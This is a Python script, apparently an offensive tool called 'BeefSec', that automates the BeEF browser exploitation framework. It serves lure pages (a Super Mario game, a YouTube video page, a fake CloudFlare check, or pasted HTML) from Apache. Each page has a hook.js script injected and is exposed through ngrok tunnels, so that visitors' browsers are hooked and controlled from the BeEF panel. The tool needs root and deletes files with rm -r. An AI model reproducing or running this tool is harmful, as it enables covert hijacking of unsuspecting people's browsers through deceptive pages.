import requests
import os
import sys
import time
import signal


##Please enter the html code of the site inside (''' ''') these##  Manual Page Mode

site = ('''     ''')  












######################################################################################################################################################################
def core():
    os.system('sudo cp -r Core/* /var/www/html')
    inplace_change('/var/www/html/index.html', 'beefip', x)
    cloudflare()
    startbeef()
    inplace_change('/var/www/html/beef.js', 'youhacker55', "http://" + z + ":80/hook.js")
    inplace_change('/var/www/html/beef.js', 'youhacker2', z)
    print(Green + "\nBeef Controll Panel: http://localhost:3000/ui/panel")
    print(Green + "\nGenarating Link")
    time.sleep(5)
    print(Green + "\nLink : http://" + x)
    print(Red + "\nCRTL + C for exit")
    signal.pause()

def Deletezombie():
    delete = input(Red+ "\nAre you sure want to delete Beef zombies(Y/n)? ")
    if delete == 'Y':
        if os.path.exists('/usr/share/beef-xss/db/beef.db') == True:
            print(Green + "\nFound Beef Database")
            os.system('rm -r /usr/share/beef-xss/db/beef.db')
            print(Green+"\nDatabase Deleted ! !")

        else:
            print(Red + "\nCan t find Beef database")
    else:
        sys.exit()

def cloudflare():

    cloudflare = input(Green+"\nDo you want to use fake CloudFlare protection(Y/n)? ")
    if cloudflare == 'Y':
        os.system("sudo cp -r cloudflare/cloudflare.html /var/www/html")
        os.system('cd /var/www/html && mv index.html page.html')
        os.system('cd /var/www/html && mv cloudflare.html index.html')
    else:
        pass


def ytbvid():
    changeid = input("Youtube Video URL: ")
    os.system('sudo cp -r yt-watch/index.html /var/www/html')
    inplace_change('/var/www/html/index.html', 'beefip', x)
    inplace_change('/var/www/html/index.html', 'DistractVic', changeid)
    cloudflare()
    startbeef()
    inplace_change('/var/www/html/beef.js', 'youhacker55', "http://" + z + ":80/hook.js")
    inplace_change('/var/www/html/beef.js', 'youhacker2', z)
    print(Green + "\nBeef Panel: http://localhost:3000/ui/panel")
    print(Green + "\nGenarating Link")
    time.sleep(5)
    print(Green + "\nLink: http://" + x)
    print(Red + "CRTL + C to exit")
    signal.pause()

def Default():
    inplace_change('/var/www/html/beef.js', 'youhacker55', "http://" + z + ":80/hook.js")
    inplace_change('/var/www/html/beef.js', 'youhacker2', z)
    with open('/var/www/html/index.html', 'w') as index:
        index.write('<script src="http://' + x + '/beef.js"></script>')
        index.write(site)
        index.close()
    startbeef()
    print(Green + "\nBeef Panel: http://localhost:3000/ui/panel")
    print(Green + "\nGenarating Link")
    time.sleep(5)
    print(Green + "\nLink: http://" + x)



def finish():
    remove = input("\nRemove the files on the apache directory(recomended)[Y/n]? ")
    if remove == 'Y':
        print(Green + "[+]" + "Removing files")
        os.system('rm -r /var/www/html/*')
    else:
        exit()
Red ="\u001b[31m"
Green ="\u001b[32m"
if os.getuid() == 0:
    pass
else:
    print(Red+"This tool requires root permission to run")
    sys.exit()
def banner():
    os.system("clear")
    print(Green + """   
                                                               @@(                 
                                  .@@@@@@@@@@@&&&@@*    ,@@@.                   
                              (@@@@(              .@@@@@@                       
                            @&@,         ,%%%*                                  
                          @&@       @@&@@*   .%@&@@                             
                         @@@     *@@%             @@@                           
                        @@@     *@@                #@@                          
   ./(%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#/,   
                     /@@ @&(     @&#        @@%    (@@                          
                    %@@   @@@      @&@@&@&&@&     (&@                           
                   @@@      @@@                 (@@(                            
                  @&@@@@&(*   &@@&@.        %@@@&                               
                                ,#&@@@@@@#. """)
    print(Red + """                                                                
                                                      
██████╗ ███████╗███████╗███████╗███████╗███████╗ ██████╗
██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
██████╔╝█████╗  █████╗  █████╗  ███████╗█████╗  ██║     
██╔══██╗██╔══╝  ██╔══╝  ██╔══╝  ╚════██║██╔══╝  ██║     
██████╔╝███████╗███████╗██║     ███████║███████╗╚██████╗
╚═════╝ ╚══════╝╚══════╝╚═╝     ╚══════╝╚══════╝ ╚═════╝""")
    print("                           \033[37mA automated browser exploitation framework :)")
    print("                           \033[37mPowered By youhacker55\n")
    print("                           \033[37mCoded by R00tDev1l\n")
banner()

def movehook():
    os.system("sudo cp beef.js /var/www/html")
movehook()


def inplace_change(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print(Red+'"{old_string}" not found in {filename}.'.format(**locals()))
            return

    with open(filename, 'w') as f:
        print(Green+'Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals()))
        s = s.replace(old_string, new_string)
        f.write(s)


def signal_handler(sig, frame):
    print("Crtl + C detected Stopping Beef")
    os.system('sudo beef-xss-stop')
    finish()
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def apache2():
    print(Green+"[+]"+"Starting apache2 server\n")
    time.sleep(2)
    os.system("sudo service apache2 start")
apache2()
def checkngrokparam(ngrokpath, targettouse):
    with open(ngrokpath, 'r') as read_obj:
        for line in read_obj:
            if targettouse in line:
                return True
    return False


def auth():
    auth = input(Red+'Enter ngrok authtoken: ')
    os.system("./ngrok authtoken " + auth)
    print("")

if os.system("which ngrok >/dev/null 2>&1") == 0:
    pass
else:
    if os.system("which pip3 >/dev/null 2>&1") != 0:
        os.system("sudo apt-get install python3-pip beef-xss")
        os.system("pip3 install pyngrok")
        os.system("sudo apt-get install gnome-terminal -y")
        print(Green+"[+]""Everything is installed")

if os.path.exists('/root/.ngrok2/ngrok.yml') == False:
    auth()
else:
    pass



with open('/root/.ngrok2/ngrok.yml','r') as ngrok:

    while '{}' in ngrok.read():
        print(Red+"[-]""Ngrok autotoken not detected")
        auth()
    else:
        pass
    g = """
tunnels:
                       first-app:
                        addr: 80
                        proto: http
                       second-app:
                        addr: 3000
                        proto: http
                        """
    if checkngrokparam('/root/.ngrok2/ngrok.yml', '#capture'):

        pass
    else:
        print(Green+'[+]'+"Configuring Ngrok")
        with open('/root/.ngrok2/ngrok.yml','a') as ngrok3:
            ngrok3.write('#capture')
            ngrok3.write(g)
            ngrok3.close()



def startbeef():
    os.system('beef-xss')

try:
    os.system("gnome-terminal -- ./ngrok start -all")
    print(Red + "\nConfiguring Ngrok please wait for 30 seconds.")
    time.sleep(30)
    url = "http://127.0.0.1:4040/api/tunnels/first-app"
    recived = requests.get(url)
    http = recived.json()["public_url"]
    url2 = 'http://127.0.0.1:4040/api/tunnels/second-app'
    recived2 = requests.get(url2)
    http2 = recived2.json()["public_url"]
    x = http[8:]
    z = http2[8:]
    print(Green + """ 

________________________________
| Availble WebPages Interfaces |
|------------------------------|    
1) SuperMario Game
2) Youtube Video Page
3) Core Game
4) Manuall Page Mode
5) Delete all beef zombies""")
    print(Red + "\nCTRL + C to exit")
    b = input(Green+'\nSelect option: ')
    if b == "1":
        startbeef()
        os.system('sudo cp -r Super-Mario/* /var/www/html')
        inplace_change('/var/www/html/index.html', 'youhacker', x)
        inplace_change('/var/www/html/beef.js', 'youhacker55', "http://" + z + ":80/hook.js")
        inplace_change('/var/www/html/beef.js', 'youhacker2', z)
        cloudflare()
        print(Green + "\nBeef Panel: http://localhost:3000/ui/panel")
        print(Green + "\nGanerating Link")
        time.sleep(5)
        print(Green + "\nLink: http://" + x)
        print(Red + "\nCRTL + C to exit")
        signal.pause()
    elif b == "2":
        ytbvid()
    elif b == '5':
        Deletezombie()
    elif b == "3":
        core()



    else:
        Default()
        print(Red + "CRTL + C to exit")
        signal.pause()





except requests.ConnectionError:
    print("start ngrok just type:sudo ngrok  start -all ")

